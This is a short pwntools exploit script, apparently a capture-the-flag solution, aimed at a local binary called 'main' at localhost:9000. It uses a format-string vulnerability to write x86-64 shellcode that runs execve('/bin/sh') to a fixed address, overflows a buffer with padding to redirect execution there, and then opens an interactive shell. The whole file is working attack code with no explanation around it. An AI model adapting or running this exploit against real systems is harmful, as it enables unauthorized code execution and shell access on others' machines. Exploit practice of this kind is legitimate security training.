from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=1 # 0 remote , 1 local , 2 local + gdb
nc="nc localhost 9000"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 51
    c
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)

offset = 0x6

addr = 0x67676767000

target_writes = {
    addr:        0x4850f63148d23148,
    addr + 0x8:  0x68732f6e69622fbf,
    addr + 0x10: 0xb0c031e789485700,
    addr + 0x18: 0x00000000050f903b,
}

payload = fmtstr_payload(offset, target_writes)
payload += b"a"*(0x208-len(payload)) + b"\x00\x70\x76\x76\x76\x06\x00\x00"

print(hex(len(payload)))
p.sendline(payload)

p.interactive()